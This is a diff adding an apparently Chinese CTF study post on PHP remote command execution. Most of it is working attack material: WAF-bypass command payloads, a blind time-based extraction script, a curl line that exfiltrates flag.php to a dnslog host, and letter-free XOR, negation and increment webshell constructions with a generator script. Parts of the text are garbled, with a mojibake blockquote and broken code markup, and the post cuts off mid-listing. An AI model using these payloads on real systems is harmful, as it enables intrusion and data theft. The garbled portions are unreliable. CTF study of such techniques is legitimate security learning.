@@ -177,6 +177,449 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2026/07/02/RCE/" class="article-date">
+      <time datetime="2026-07-02T14:00:00.000Z" itemprop="datePublished">2026-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2026/07/02/RCE/">RCE</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>??????????????? CTF ??????????????<br>?????? PHP shell ???????????<code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br>?????? PHP payload ?????????<code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br><code>shell.php</code> ??????? <code>output.txt</code>????????????????????</p>
+</blockquote>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="命令执行（执行系统命令）"><a href="#命令执行（执行系统命令）" class="headerlink" title="命令执行（执行系统命令）"></a>命令执行（执行系统命令）</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>是否直接把命令输出打印到页面？</th>
+<th>返回值是什么？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>system()</code></td>
+<td>执行系统命令</td>
+<td>✅ 会把命令执行过程的输出打印出来</td>
+<td>返回命令输出的<strong>最后一行</strong>（字符串）</td>
+</tr>
+<tr>
+<td><code>passthru()</code></td>
+<td>执行命令并“原样”输出（适合二进制流）</td>
+<td>✅ 直接输出所有原始内容</td>
+<td>一般返回 <code>null</code></td>
+</tr>
+<tr>
+<td><code>exec()</code></td>
+<td>执行命令</td>
+<td>❌ 默认不输出</td>
+<td>返回最后一行文本，可选把每一行放到数组</td>
+</tr>
+<tr>
+<td><code>shell_exec()</code></td>
+<td>通过 shell 执行命令</td>
+<td>❌ 不直接输出</td>
+<td>返回<strong>完整输出字符串</strong></td>
+</tr>
+<tr>
+<td>反引号 <code>...</code></td>
+<td>和 <code>shell_exec()</code> 类似</td>
+<td>❌ 不直接输出</td>
+<td>返回命令输出（字符串）</td>
+</tr>
+<tr>
+<td><code>popen()</code></td>
+<td>打开一个进程的管道（读 &#x2F; 写）</td>
+<td>❌ 本身不输出</td>
+<td>返回资源句柄，自己读写</td>
+</tr>
+<tr>
+<td><code>proc_open()</code></td>
+<td>更高级的进程控制，多路管道</td>
+<td>❌ 本身不输出</td>
+<td>返回进程资源，还可拿到各个管道句柄</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>总结：<strong>直接把结果“打印出来”的</strong>主要是 <code>system()</code> 和 <code>passthru()</code>，其它大部分都是“<strong>返回字符串&#x2F;资源</strong>”，需要自己 <code>echo</code> &#x2F; <code>var_dump</code> 才看得到。</p>
+</blockquote>
+<ul>
+<li><p><strong>直接回显的（命令执行时就打印到页面）</strong>：</p>
+<ul>
+<li><code>system()</code>、<code>passthru()</code></li>
+</ul>
+</li>
+<li><p><strong>只返回结果，不主动回显的</strong>：</p>
+<ul>
+<li><code>exec()</code>、<code>shell_exec()</code>、反引号、<code>popen()</code>、<code>proc_open()</code>（这些要你自己把结果 echo 出来）</li>
+<li><pre><code>string exec(string $command, array &amp;$output = null, int &amp;$return_var = null)
+$command string要执行的系统命令
+&amp;$output array（引用）|接收命令标准输出的每一行不含换行符）,每次调用会追加内容！使用               前需 `unset($output)` 或 `$output = []`|
+&amp;$return_var int（引用）|接收命令退出状态码（0=成功）|
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">      </span><br></pre></td></tr></table></figure>
+   popen(string $command, string $mode)
+   command参数:要执行的命令。
+   mode参数:模式。&#39;r&#39;表示阅读，&#39;w&#39;表示写入fgets获取内容→print_r输出内容
+</code></pre>
+</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 绕过</span><br><span class="line">### 过滤字符</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>（1）使用通配符绕过</p>
+<p>形如：f???​或者f*​匹配flag文件</p>
+<p>（2）使用单引号绕过fla’’g​</p>
+<p>（3）使用\​绕过fla\g​</p>
+<p>（4）使用{}​绕过，如fl{a}g​</p>
+<p>（5）使用正则匹配绕过，如fl[a-a]g​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 过滤函数</span><br></pre></td></tr></table></figure>
+<p>cat<br>tac<br>more<br>head<br>tail<br>nl<br>strings<br>sort<br>less<br>awk<br>sed<br>grep<br>base64<br>rev<br>od<br>vi<br>vim<br>pr<br>uniq</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤了/​</span><br><span class="line"></span><br><span class="line">绕过方法：</span><br><span class="line">1.利用cd指令切目录</span><br></pre></td></tr></table></figure>
+<p>payload：cd ..&amp;&amp;ls​，cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;ls​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.通过dirname在当前目录一个个消除路径，直到最终到达根目录</span><br></pre></td></tr></table></figure>
+<p>payload&#x3D;ls${IFS}-a${IFS}$(dirname${IFS}$(dirname${IFS}$(dirname${IFS}$PWD)))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用&lt;​ 、&lt;&gt;​、%20​(space)、%09​(tab)、$IFS$9​、 ${IFS}​、$IFS​等代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 变量拼接绕过正则</span><br></pre></td></tr></table></figure>
+<p>以flag为例:</p>
+<p>x&#x3D;ag;cat fl$x</p>
+<p>相当于:</p>
+<p>cat flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Linux 变量操作符$&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>${PATH:start:length}<br>start：起始位置<br>length：截取长度，可为负数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**替换字符**</span><br><span class="line">单替换</span><br></pre></td></tr></table></figure>
+<p> ${file&#x2F;a&#x2F;b}<br>将字符串中第一个a替换为b<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**全替换**</span><br></pre></td></tr></table></figure><br> ${file&#x2F;&#x2F;a&#x2F;b}<br>将字符串所有的a替换为b<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br></pre></td></tr></table></figure><br> ${PATH:14:1}${PATH:5:1} flag.txt</p>
+<p>在此环境中相当于 nl flag.txt<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### Ascll拼接变形</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
+<p>$func &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</p>
+<p>$cmd &#x3D; ‘’;</p>
+<p>$cmd_chars &#x3D; [108,115];</p>
+<p>foreach($cmd_chars as $ascii) {</p>
+<p>    $cmd .&#x3D; chr($ascii);</p>
+<p>}</p>
+<p>@$func($cmd);</p>
+<p>?&gt;<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">转ascll脚本</span><br></pre></td></tr></table></figure><br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
+<p>$filename &#x3D; “cat 6a2139364f96787c8ce1bbb0070b898c.php”;</p>
+<p>$ascii_array &#x3D; [];</p>
+<p>for ($i &#x3D; 0; $i &lt; strlen($filename); $i++) {</p>
+<p>    $ascii_array[] &#x3D; ord($filename[$i]);</p>
+<p>}</p>
+<p>echo implode(“,”, $ascii_array);</p>
+<p>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 按位取反（~） + 十六进制转义（\x）试一下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>
+
+<p>$func &#x3D; create_function(‘’, ~”\x8f\x97\x8f\x96\x91\x99\x93”[‘cmd’]);</p>
+<p>$func();</p>
+<p>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 无回显</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### if</span><br></pre></td></tr></table></figure>
+<p>import requests<br>import time<br>url &#x3D; “<a target="_blank" rel="noopener" href="http://192.168.1.6:19080/class08/1.php">http://192.168.1.6:19080/class08/1.php</a>“<br>result &#x3D; “”<br>for i in range(1,5):<br>    for j in range(1,55):<br>    #ascii镶嵌<br>    for k in range(32,128):<br>    k&#x3D;chr(k)<br>    #time.sleep(0.1)<br>    payload &#x3D; “?cmd&#x3D;” + f”if [ &#96;cat flag.php | awk NR&#x3D;&#x3D;{i} | cut -c {j} &#x3D;&#x3D; {k} ] ;then sleep 2;fi”<br>    try:<br>    requests.get(url&#x3D;url+payload, timeout&#x3D;(1.5,1.5))<br>    except:<br>    result &#x3D; result + k<br>    print(result)<br>    break<br>result +&#x3D; “”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">### tee</span><br><span class="line">### [SWPUCTF 2021 新生赛]finalrce (NSSCTF)</span><br><span class="line">![Pasted image 20251130141151](/images/rce/pasted-image-20251130141151.png)</span><br><span class="line"></span><br><span class="line"> 因为没有回显，所以需要把查看出来的内容读取并且写入一个地方来查看，tee命令就是从标准输入读取，再写入标准输出和文件。简单说就是把查看的内容读取然后写入到后面的txt文件</span><br><span class="line"> &gt;&quot;\\&quot;-转义符我理解的作用就是在一些控制字符被过滤的时候，可以用转义符，让控制符失去原本的含义，变为字面量，但是作用不变。</span><br><span class="line"> </span><br><span class="line">/?url=l\s / |tee 1.txt,然后访问1.txt看到flag文件</span><br><span class="line">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt，访问2.txt就看到flag了</span><br><span class="line"></span><br><span class="line">### dnslog外带数据法</span><br><span class="line">```  </span><br><span class="line">    curl dnslog平台url/`cat flag.php|base64`</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p> [SWPUCTF 2021 新生赛]hardrce (NSSCTF)<br><img src="/images/rce/pasted-image-20251130134820.png" alt="Pasted image 20251130134820"><br>不能使用字母和黑名单的特殊字符，但是有eval，满足条件即可执行<br>绕过方法：对需要使用的函数进行取反，然后再进行URL 编码</p>
+<ul>
+<li>注意：在使用取反编码再取反进行绕过时，想要执行我们指定的代码，传入的payload必须要满足 <strong>(函数名)()</strong> 这样的形式，否则在取反之前PHP解释器并不知道是要执行一个函数，取反之后就算是一个函数也不会被当作代码执行<br>执行system(‘ls &#x2F;‘)，取反?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C%DF%D0);找到flllllaaaaaaggggggg的文件<br>执行system(“cat &#x2F;flllllaaaaaaggggggg”);取反后?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);即可得到flag<br>脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">$a=&quot;system&quot;;</span><br><span class="line"></span><br><span class="line">$b = &quot;tac /f*&quot;;</span><br><span class="line"></span><br><span class="line">echo urlencode(~$a);</span><br><span class="line"></span><br><span class="line">print(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">echo urlencode(~$b);</span><br><span class="line"></span><br><span class="line">print(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">print(&quot;(~&quot;.urlencode(~$a).&quot;)(~&quot;.urlencode(~$b).&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/rce/pasted-image-20260215191010.png" alt="Pasted image 20260215191010"></p>
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">echo &#x27;A&#x27;^&#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
+<p>首先将 <code>A</code> 和 <code>?</code> 分别转换为对应的ASCII码，A变为65，?变为63 然后将其转换为对应的二进制数，A变为<code>1000001</code>，?变为<code>111111</code> 接下来就进行运算，异或的运算规则是相同为0，不同为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A:		1000001</span><br><span class="line">1:		0111111(少一位，前面补0即可) </span><br><span class="line">结果：	1111110</span><br></pre></td></tr></table></figure>
+<p>接下来将其二进制转换为对应十进制数，<code>1111110</code>对应的十进制数为<code>126</code>，根据ASCII码表可知126对应的是<code>~</code><br>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$__=(&quot;#&quot;^&quot;|&quot;); // _</span><br><span class="line">$__.=(&quot;.&quot;^&quot;~&quot;); // _P</span><br><span class="line">$__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class="line">$__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class="line">$__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class="line">$$__[_]($$__[__]); // $_POST[_]($_POST[__]);</span><br></pre></td></tr></table></figure>
+<p>然后进行一次URL编码，因为中间件会解码一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后让&amp;_=system和&amp;__=ls即可</span><br></pre></td></tr></table></figure>
+
+<p>或者脚本直接出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"></span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line"></span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,256): #设置i的范围</span><br><span class="line"></span><br><span class="line">    c=chr(i)</span><br><span class="line"></span><br><span class="line">    #将i转换成ascii对应的字符，并赋值给c</span><br><span class="line"></span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c,re.I)</span><br><span class="line"></span><br><span class="line">    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span><br><span class="line"></span><br><span class="line">    if(tmp):</span><br><span class="line"></span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line">        #在数组中增加i，这些就是未被系统过滤掉的字符</span><br><span class="line"></span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line"></span><br><span class="line">myb=&quot;dir&quot;      #参数</span><br><span class="line"></span><br><span class="line">def myfun(k,my): #自定义函数</span><br><span class="line"></span><br><span class="line">    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错</span><br><span class="line"></span><br><span class="line">    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错</span><br><span class="line"></span><br><span class="line">    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量</span><br><span class="line"></span><br><span class="line">        for j in range(i,len(a)): #在上个循环的条件下设置j的范围</span><br><span class="line"></span><br><span class="line">            if(a[i]^a[j]==ord(my[k])):</span><br><span class="line"></span><br><span class="line">                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])</span><br><span class="line"></span><br><span class="line">                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])</span><br><span class="line"></span><br><span class="line">                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span><br><span class="line"></span><br><span class="line">for x in range(0,len(mya)): #设置k的范围</span><br><span class="line"></span><br><span class="line">    myfun(x,mya)#引用自定义的函数</span><br><span class="line"></span><br><span class="line">data1=&quot;(&#x27;&quot;+urllib.request.quote(ans1)+&quot;&#x27;^&#x27;&quot;+urllib.request.quote(ans2)+&quot;&#x27;)&quot; #data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span><br><span class="line"></span><br><span class="line">print(data1)</span><br><span class="line"></span><br><span class="line">ans1=&quot;&quot;#对ans1进行重新赋值</span><br><span class="line"></span><br><span class="line">ans2=&quot;&quot;#对ans2进行重新赋值</span><br><span class="line"></span><br><span class="line">for k in range(0,len(myb)):#设置k的范围为(0,len(myb))</span><br><span class="line"></span><br><span class="line">    myfun(k,myb)#再次引用自定义函数</span><br><span class="line"></span><br><span class="line">data2=&quot;(\&quot;&quot;+urllib.request.quote(ans1)+&quot;\&quot;^\&quot;&quot;+urllib.request.quote(ans2)+&quot;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">print(data2)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/rce/pasted-image-20260215190842.png" alt="Pasted image 20260215190842"></p>
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>直接拼接个空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;</span><br><span class="line">var_dump($_);成功获取到了字符`Array`</span><br></pre></td></tr></table></figure>
+<p>然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，具体实现代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[];</span><br><span class="line">$_=$_[&#x27;&#x27;==&#x27;$&#x27;];</span><br><span class="line">echo $_;</span><br></pre></td></tr></table></figure>
+<p>或者<br><img src="/images/rce/pasted-image-20260307065339.png" alt="Pasted image 20260307065339"><br>构造<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;//Array</span><br><span class="line">$_=$_[&#x27;&#x27;==&#x27;$&#x27;];//A</span><br><span class="line">$_++;//B</span><br><span class="line">$_++;//C</span><br><span class="line">$_++;//D</span><br><span class="line">$_++;//E</span><br><span class="line">$__=$_;//E</span><br><span class="line">$_++;//F</span><br><span class="line">$_++;//G</span><br><span class="line">$___=$_;//G</span><br><span class="line">$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T</span><br><span class="line">$_=$___.$__.$_;//GET</span><br><span class="line">//var_dump($_);</span><br><span class="line">$_=&#x27;_&#x27;.$_;//_GET</span><br><span class="line">var_dump($$_[_]($$_[__]));</span><br><span class="line">//$_GET[_]($_GET[__])</span><br></pre></td></tr></table></figure>
+<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;$_=$_[&#x27;&#x27;==&#x27;$&#x27;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#x27;_&#x27;.$_;$$_[_]($$_[__]);</span><br></pre></td></tr></table></figure>
+<p>而后变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D.&#x27;&#x27;%3B%24_%3D%24_%5B&#x27;&#x27;%3D%3D&#x27;%24&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D&#x27;_&#x27;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h2><h3 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br></pre></td></tr></table></figure>
+<p>原理解释</p>
+<ol>
+<li>它使用正则表达式 <code>/[^\W]+\((?R)?\)/</code> 来匹配并替换掉 <code>$_GET[&#39;star&#39;]</code> 中的某些部分</li>
+</ol>
+<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>
+3. 这实际上是一个无参数RCE的场景，因为正则表达式限制了函数调用必须不包含参数
+
+<p>正则表达式解释：</p>
+<ul>
+<li><code>[^\W]+</code>：匹配一个或多个字母、数字或下划线（即函数名）</li>
+<li><code>\(</code> 和 <code>\)</code>：匹配左右括号</li>
+<li><code>(?R)?</code>：这是递归匹配，允许嵌套的函数调用，例如 <code>a(b())</code> 这样的形式</li>
+<li>整个正则表达式会匹配类似 <code>function()</code> 或 <code>function(anotherFunction())</code> 这样的模式，但不允许 <code>function(&#39;parameter&#39;)</code> 这样的带参数的调用</li>
+</ul>
+<p>所以，这个过滤机制允许的输入形式是：</p>
+<ul>
+<li><code>function()</code></li>
+<li><code>function(anotherFunction())</code></li>
+<li><code>function1(function2(function3()))</code></li>
+</ul>
+<p>而禁止的形式是：</p>
+<ul>
+<li><code>function(&#39;text&#39;)</code></li>
+<li><code>function(123)</code></li>
+<li><code>function($variable)</code></li>
+</ul>
+<p>无参数RCE的核心是：如何在不使用任何字面量参数（如字符串、数字）的情况下，通过函数之间的嵌套调用来构造攻击载荷，最终实现远程代码执行或文件读取。</p>
+<h3 id="相关函数简要介绍："><a href="#相关函数简要介绍：" class="headerlink" title="相关函数简要介绍："></a>相关函数简要介绍：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">scandir() 